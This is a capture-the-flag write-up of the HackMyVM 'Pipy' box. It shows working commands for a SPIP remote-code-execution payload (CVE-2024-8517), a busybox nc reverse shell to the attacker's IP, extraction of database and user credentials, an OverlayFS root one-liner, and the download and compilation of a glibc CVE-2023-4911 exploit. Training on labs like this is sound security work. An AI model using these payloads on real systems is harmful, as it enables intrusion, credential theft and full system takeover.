# Pipy

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.140:22
Open 10.0.2.140:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.140
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAET5qd1B2Jb+SCBzpF6ifTWw8caKOxMvQkuyEG3M1FHRtyS6a3FyHVBAu4z3ydO6sOlycKooksFn2dDArYbQgc=
|   256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIuX5gvUlkO+6tI5fylPXGgBt8+Zc8hJXQ974OtHkGYb
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: SPIP 4.2.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mi sitio SPIP
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/pipy/writeup.png)

```bash
└─$ nuclei -u http://10.0.2.140/
[CVE-2024-8517] [http] [critical] http://10.0.2.140/spip.ph%70?pag%65=spip_pass&lang=fr
[ssh-auth-methods] [javascript] [info] 10.0.2.140:22 ["["publickey","password"]"]
[ssh-server-enumeration] [javascript] [info] 10.0.2.140:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
[composer-config:composer.json] [http] [info] http://10.0.2.140/composer.json
[composer-config:composer.json] [http] [info] http://10.0.2.140/vendor/composer/installed.json
[metatag-cms] [http] [info] http://10.0.2.140/ ["SPIP 4.2.0"]
[readme-md] [http] [info] http://10.0.2.140/README.md
[configuration-listing] [http] [medium] http://10.0.2.140/config/
[apache-detect] [http] [info] http://10.0.2.140/ ["Apache/2.4.52 (Ubuntu)"]
[spip-detect:spip_version] [http] [info] http://10.0.2.140/ ["4.2.0"]
```

### RCE

- [https://nvd.nist.gov/vuln/detail/cve-2024-8517](https://nvd.nist.gov/vuln/detail/cve-2024-8517)
- [https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/](https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/)
- POC [CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517/tree/main)

```bash
# FORM_ACTION
└─$ curl 'http://10.0.2.140/spip.php?page=contact' -s | htmlq 'input[name=formulaire_action]' -a value
ecrire_auteur
# FORM_ACTION_ARGS
└─$ curl 'http://10.0.2.140/spip.php?page=contact' -s | htmlq 'input[name=formulaire_action_args]' -a value
mY6sq/zAiNpirxAicMVgL+nRsYhmjbSa7VZchM3QR9Ryqb/MX1oco5ifgux/xDWTcR+sqXQ9byqbS95rMdwJgASxy2LiXZxDgt6ATXGQRSRBwoQtLbk4xUBVnkt7e4nt1zn5TQAGa39NW5zcBA==
# RCE
└─$ curl http://10.0.2.140/ \
  -F "formulaire_action=ecrire_auteur" \
  -F "bigup_retrouver_fichiers=1" \
  -F "formulaire_action_args=mY6sq/zAiNpirxAicMVgL+nRsYhmjbSa7VZchM3QR9Ryqb/MX1oco5ifgux/xDWTcR+sqXQ9byqbS95rMdwJgASxy2LiXZxDgt6ATXGQRSRBwoQtLbk4xUBVnkt7e4nt1zn5TQAGa39NW5zcBA==" \
  -F "RCE['.system('id').die().']=dummy.txt;type=text/plain;filename=dummy.txt"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (angela)

```bash
└─$ curl http://10.0.2.140/ \
  -F "formulaire_action=ecrire_auteur" \
  -F "bigup_retrouver_fichiers=1" \
  -F "formulaire_action_args=mY6sq/zAiNpirxAicMVgL+nRsYhmjbSa7VZchM3QR9Ryqb/MX1oco5ifgux/xDWTcR+sqXQ9byqbS95rMdwJgASxy2LiXZxDgt6ATXGQRSRBwoQtLbk4xUBVnkt7e4nt1zn5TQAGa39NW5zcBA==" \
  -F "RCE['.system('busybox nc 10.0.2.15 4444 -e /bin/bash').die().']=dummy.txt;type=text/plain;filename=dummy.txt"
---
└─$ penelope -p 4444
www-data@pipy:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@pipy:/var/www/html/config$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
angela:x:1000:1000:Angela:/home/angela:/bin/bash
```

DB credentials
```bash
www-data@pipy:/var/www/html/config$ cat connect.php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

Password is in plaintext, amazing.
```bash
www-data@pipy:/var/www/html/config$ mysql -u'root' -p'dbpassword' 'spip' -e 'SELECT login,pass FROM spip_auteurs;'
+--------+--------------------------------------------------------------+
| login  | pass                                                         |
+--------+--------------------------------------------------------------+
| angela | 4ng3l4                                                       |
| admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |
+--------+--------------------------------------------------------------+
```

## SSH

```bash
└─$ sshpass -p '4ng3l4' ssh angela@10.0.2.140
angela@pipy:~$ id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
```

### User.txt

```bash
angela@pipy:~$ cat user.txt
dab37650d43787424362d5805140538d
```

## Privilege Escalation

No sudo, SUIDs, capabilities or anything in `/opt`. There's a weird port opened on 4226, but couldn't fingerprint it.
```bash
angela@pipy:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
...
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

The kernel version do be very old

![writeup-1.png](/assets/pentest/hackmyvm/pipy/writeup-1.png)

- [Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629)](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)

```bash
angela@pipy:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'";rm -rf l u w m
uid=0(root) gid=0(root) groups=0(root)
```

```bash
angela@pipy:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"bash -p\")'";rm -rf l u w m
root@pipy:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@pipy:/# ls /root
ls: cannot open directory '/root': Permission denied
```

Hmmm...

We are root, but not root root?
```bash
root@pipy:/tmp# install -m 4777 /bin/bash /tmp/rootbash
root@pipy:/tmp# exit
angela@pipy:/tmp$ /tmp/rootbash -p -c id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
angela@pipy:/tmp$ ls -alh /tmp/rootbash
-rwsrwxrwx 1 angela angela 1.4M Dec 13 10:37 /tmp/rootbash
```

The privilege escalation is definitely related to some old version of system component or binary.

![writeup-2.png](/assets/pentest/hackmyvm/pipy/writeup-2.png)

- [https://ubuntu.com/security/CVE-2023-5345](https://ubuntu.com/security/CVE-2023-5345)
- [https://ubuntu.com/security/CVE-2023-4911](https://ubuntu.com/security/CVE-2023-4911)

The 4911 seems promising
- [GNU C Library's Dynamic Loader Vulnerability (CVE-2023-4911)](https://github.com/NishanthAnand21/CVE-2023-4911-PoC)

As blog mentioned **Segmentation** means **Exploitable**
```bash
angela@pipy:/tmp$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
Segmentation fault (core dumped)
```

```bash
# Compile exploit binary
angela@pipy:/tmp$ curl https://raw.githubusercontent.com/NishanthAnand21/CVE-2023-4911-PoC/refs/heads/main/exploit.c -s | gcc -x c - -o exploit
# Create LIBC
angela@pipy:/tmp$ curl https://raw.githubusercontent.com/NishanthAnand21/CVE-2023-4911-PoC/refs/heads/main/genlib.py -s | python3
# Exploit # Will take time
angela@pipy:/tmp$ ./exploit
try 100
try 200
try 300
try 400
try 500
try 600
try 700
try 800
try 900
# id
uid=0(root) gid=1000(angela) groups=1000(angela)
# ls /root
root.txt  snap
```

We got proper toor \o/

### Root.txt

```
# cat /root/root.txt
ab55ed08716cd894e8097a87dafed016
```